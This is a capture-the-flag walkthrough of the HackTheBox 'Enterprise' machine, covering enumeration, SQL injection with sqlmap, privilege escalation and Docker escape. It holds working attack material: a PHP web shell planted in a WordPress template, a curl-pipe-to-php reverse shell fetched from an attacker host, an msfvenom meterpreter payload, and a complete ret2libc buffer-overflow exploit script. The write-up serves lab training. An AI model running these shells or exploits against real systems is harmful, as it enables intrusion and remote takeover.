# HTB - Enterprise

## Enumeration

Our nmap scan reveals
- port 22 open for ssh with an Ubuntu header  
- port 80 open for http running apache with wordpress on a Debian server
- port 443 open for https running Apache2 on an Ubuntu server
- port 8080 open for http running Apache with Joomla! on a Debian server

It is very interesting that the scan is reporting two different operating systems, and is the first indication that there is some stuff running inside of Docker containers here  

We can get to all three webpages without editing `/etc/hosts` but the wordpress site looks very strange. Looking at page source with `ctrl+u` we can see that this is because all fo the javascript is referenced using enterprise.htb urls, which we cannot dns resolve. So add enterprise.htb to `/etc/hosts` to fix this  

There is a post by the user william.riker on the WP site  

We can run a wordpress scan against the wordpress site with:  
`wpscan --url http://10.10.10.61 --enumerate ap,u,tt | tee wpscan.log`  

At the same time we can run a dir bust against the https site with:  
`gobuster dir -u https://10.10.10.61/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k`  
The `-k` means don't require a valid SSL cert (same as curl)  

The gobuster scan reveals a directory files exists. Navigating to this directory, we can see lcars.zip which we can download  

<br />

## SQL Mapping

lcars.zip contains three files, one of which tells us that this is a wordpress plugin  

A quick Google search will tell us that WP plugins by default are at `/wp-content/plugins/<plugin name>`  

There are two other php files in lcars.zip, lcars_db.php and lcars_dbpost.php
lcars_db.php is vulnerable to SQL injection  

We can capture a request to http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 and send it to Burp  

We can then save the burp file as a .req and use sql map
`sqlmap -r ~/Documents/enterprise_lcars_db.req --dbms mysql`  
We can specify dbms mysql because we saw it was using mysql in the php script  
Once we see the query parameter is vulnerable to a boolean-based blind we can do:  
`sqlmap -r ~/Documents/enterprise_lcars_db.req --dbms mysql --batch --technique=B --dump`  
This runs for a really long time, but eventually dumps william.riker's wordpress password  

<br />

## Wordpress Template Modification

We can log in to wordpress as William.Riker at:  
http://enterprise.htb/wp-login.php  

Then we can add:  
```php
echo system($_REQUEST['aaa']);
```
to the start of a template file (after the `<?php`)  
This command is at:  `/usr/share/webshells/php/cmd.php`  

Now, when we navigate to http://enterprise.htb?aaa=ls  
The page source will show the output of the ls command

## Pivoting to the mysql server

We can get a php reverse shell from:  
`/usr/share/webshells/php/php-reverse-shell.php`  
We need to change the lhost and lport of this shell  
Host an http server on 80 and (using burp) send:  
`aaa=curl 10.10.14.4/php-reverse-shell.php|php`  
while listening on the port we specified with nc  

And we get a shell on the box. `hostname` reveals that this is in fact a docker container  
`ip a` shows that we are dual-homed on the 10.10 network and on a 172.17 network  
`ip neigh` reveals that there is a host running on 172.17.0.2 which we can assume is the mysql server  

I can't really remember this part, but we find the password for the mysql server somewhere on the first docker container  

Now, we create a meterpreter shell to replace our php shell with:  
`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=8002 -f elf -o linux_rev_shell`  

Send it over with an http server / curl, chmod +x it, listen with msfconsole exploit/multi/handler, and run it to get a meterpreter session

I got very caught up here trying to use meterpreter port fwds to pivot to the mysql server. It is very buggy. Would highly reccomend using `chisel` instead. See the examples in `Chisel_Pivoting.md` for how to do that  

<br />

## Escaping Docker

We can basically do the same template thing we did with Docker on the Joomla server once we have login creds  
This gives us a basic php rev shell  
When we run `mount`, unlike on the Wordpress host, we can see:  
`/dev/mapper/enterprise--vg-root on /var/www/html/files type ext4`  
This probably means that we can put things in the /files directory used by the https server from before.  
Putting a new PHP reverse shell there, and starting a listener, we can click on the php reverse shell in our browser, and get a connection back, this time from the host itself, not from a docker container.  

Unlike the containers, this host does have python installed, so we can do:  
`python3 -c 'import pty;pty.spawn("/bin/bash")'`  
`ctrl z`  
`stty raw -echo; fg`  
to upgade our shell  

<br />

## Privilege Escalation

Grab LinEnum from https://github.com/rebootuser/LinEnum and copy it over to the box  

Running LinEnum.sh shows us that `/bin/lcars` is a binary with the suid bit set  
Because this is a HTB box, we can be pretty sure that this is what we are meant to exploit  

In the `[-] Listening TCP` section, linEnum also shows that we are listening on port `32812`. Our nmap scan did not catch this because it is a non-standard port. 

Running `netstat -alnp | grep LIST` is another way to show all the ports this box is listening on  

if we `nc 10.10.10.61 32812` we can see that it is in fact the lcars binary which is running on that port  

Getting the binary off the box:
- base64 /bin/lcars  
- copy the b64:  
    - `ctrl+space [` to enter tmux copy mode  
    - vim h j k l keys to move around  
    - 'space' to start copying
    - 'enter' to copy
    - 'ctrl+space ]` to paste from tmux buffer  
- paste in b64 on attack box in a file
- `base64 --decode lcars.b64 > lcars.bin`
- `md5sum lcars.bin` and `md5sum /bin/lcars` to make sure they match  

Now we can RE the binary  
There is a quick bridge access code password check that is super easy to see in memory
Its a simple buffer overflow that lets us execute a ret2libc  

`file` on the binary tells us it is a 32-bit elf binary  
ASLR is off on the target system ( `/proc/sys/kernel/randomize_va_space` = 0 )  
We have GDB on the target system meaning we can just `p system` to find system's address in the loaded libc, and `find &system,+9999999,"sh"` to find an occurence of the 'sh' string in the loaded libc  

Here is the relatively simple exploit:
```python
# lcars is a 32-bit dynamically linked binary
# ASLR is turned off on the target box

# We can run GDB on the target box to print the address of libc system and an address of the string "sh"
# Then, its a simple buffer overflow after a password check to get a shell

import pwn
import struct

HOST, PORT = '10.10.10.61', 32812

r = pwn.remote(HOST, PORT)

# gdb on the target: p system
system_addr = struct.pack("<I", 0xf7e4c060)
# gdb on the target: find &system,+9999999,"sh"
# x/s 0xf7f6ddd5 to verify
sh_addr = struct.pack("<I", 0xf7f6ddd5)

payload = b'a' * 212
payload += system_addr
payload += b'a' * 4 # fill system's return address with garbage (usually people would just use the address of exit() to do this)
payload += sh_addr

r.recvuntil("Enter Bridge Access Code:")
r.sendline("picarda1")
r.recvuntil("Waiting for input:")
r.sendline("4")
r.recvuntil("Enter Security Override:")
r.sendline(payload)
r.interactive()
```
